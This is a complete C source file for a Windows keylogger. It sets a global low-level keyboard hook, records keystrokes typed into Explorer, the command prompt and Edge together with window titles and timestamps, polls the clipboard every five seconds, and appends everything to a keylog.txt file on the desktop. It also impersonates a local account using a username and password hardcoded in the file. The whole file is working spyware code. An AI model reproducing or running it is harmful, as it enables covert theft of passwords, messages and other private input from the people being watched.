#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <shlobj.h>
#include <string.h>
#include <psapi.h>
#pragma comment(lib, "Psapi.lib")

#pragma warning(push)
#pragma warning(disable : 4820)
#include <userenv.h>
#pragma warning(pop)

#define USER "jareste"
#define DOMAIN "."
#define PASSWORD "1234"

#define MAX_PATH_LENGTH 260
char LOG_FILE[MAX_PATH_LENGTH];
char lastClipboardContent[1024] = "";
void ImpersonateUser(const char* username, const char* domain, const char* password)
{
    HANDLE hToken;
    if (LogonUserA(username, domain, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hToken))
    {
        if (ImpersonateLoggedOnUser(hToken))
        {
            CloseHandle(hToken);
            return;
        }
        CloseHandle(hToken);
    }
}

void SetLogFilePath(void)
{
    PWSTR desktopPath = NULL;
    HRESULT result = SHGetKnownFolderPath(&FOLDERID_Desktop, 0, NULL, &desktopPath);

    if (result == S_OK)
    {
        char path[MAX_PATH];
        size_t convertedChars = 0;

        if (wcstombs_s(&convertedChars, path, MAX_PATH, desktopPath, _TRUNCATE) == 0)
        {
            snprintf(LOG_FILE, MAX_PATH, "%s\\keylog.txt", path);
        }
        else
        {
            snprintf(LOG_FILE, MAX_PATH, "C:\\keylog.txt");
        }
        
        CoTaskMemFree(desktopPath);
    }
    else
    {
        snprintf(LOG_FILE, MAX_PATH, "C:\\keylog.txt");
    }
}

BOOL isApplicationAllowed(char* currentApplication)
{
    char* allowedApplications[] = {/*"Notepad.exe",*/ "explorer.exe", "cmd.exe", "msedge.exe"};

    size_t appCount = sizeof(allowedApplications) / sizeof(allowedApplications[0]);
    for (size_t i = 0; i < appCount; i++)
    {
        if (i < appCount && strstr(currentApplication, allowedApplications[i]))
        {
            return TRUE;
        }
    }
    return FALSE;
}

BOOL GetActiveApplication(char* appPath, size_t appPathSize)
{
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return FALSE;

    DWORD pid;
    GetWindowThreadProcessId(hwnd, &pid);

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (hProcess)
    {
        if (GetModuleFileNameEx(hProcess, NULL, appPath, (DWORD)appPathSize))
        {
            CloseHandle(hProcess);
            return TRUE;
        }
        CloseHandle(hProcess);
    }
    return FALSE;
}

void LogKeystroke(char* keystroke, BOOL clipboard)
{

    FILE* file = fopen(LOG_FILE, "a");
    if (!file) return;

    time_t t = time(NULL);
    struct tm* tm_info = localtime(&t);
    char time_str[20];
    strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", tm_info);

    char activeApp[MAX_PATH] = "<unknown>";
    if (GetActiveApplication(activeApp, sizeof(activeApp)))
    {
        if (!isApplicationAllowed(activeApp) && !clipboard) return;
    }

    HWND hwnd = GetForegroundWindow();
    char windowTitle[256];
    GetWindowText(hwnd, windowTitle, sizeof(windowTitle));

    if (clipboard)
    {
        fprintf(file, "[%s] - '%s': [CLIPBOARD] %s\n", time_str, windowTitle, keystroke);
    }
    else
    {
        fprintf(file, "[%s] - '%s': %s\n", time_str, windowTitle, keystroke);
    }
    fclose(file);
}

void LogClipboardContent(void)
{
    if (OpenClipboard(NULL))
    {
        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData)
        {
            char* clipboardText = (char*)GlobalLock(hData);
            if (clipboardText)
            {
                if (strncmp(clipboardText, lastClipboardContent, 1023) != 0)
                {
                    LogKeystroke(clipboardText, TRUE);
                    strncpy_s(lastClipboardContent, sizeof(lastClipboardContent), clipboardText, 1023);
                    lastClipboardContent[1023] = '\0';
                }
                GlobalUnlock(hData);
            }
        }
        CloseClipboard();
    }
}

DWORD WINAPI ClipboardLoggerThread(LPVOID lpParam)
{
    (void)lpParam;
    while (1)
    {
        LogClipboardContent();
        Sleep(5000);
    }
    return 0;
}

void LogKeyPress(DWORD vkCode)
{
    HKL keyboardLayout = GetKeyboardLayout(0);
    BYTE keyboardState[256];
    char keyName[16] = {0};

    if (!GetKeyboardState(keyboardState)) return;

    int len = ToAsciiEx(vkCode, MapVirtualKeyEx(vkCode, MAPVK_VK_TO_VSC, keyboardLayout),
                        keyboardState, (LPWORD)keyName, 0, keyboardLayout);

    if (len == 1)
    {
        keyName[1] = '\0';
        LogKeystroke(keyName, FALSE);
    }
    else if (vkCode == VK_RETURN)
    {
        LogKeystroke("[ENTER]", FALSE);
    }
    else if (vkCode == VK_SPACE)
    {
        LogKeystroke("[SPACE]", FALSE);
    }
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            LogKeyPress(pKeyBoard->vkCode);
        }
    }
    LogClipboardContent();
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}


int main(void)
{
    /* in case this would fail, it wouldn't log into the user but 
        into c:\ directly
    */
    ImpersonateUser(USER, DOMAIN, PASSWORD);
    
    SetLogFilePath();

    HANDLE hClipboardThread = CreateThread(NULL, 0, ClipboardLoggerThread, NULL, 0, NULL);

    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    if (!hHook)
    {
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    CloseHandle(hClipboardThread);

    return 0;
}
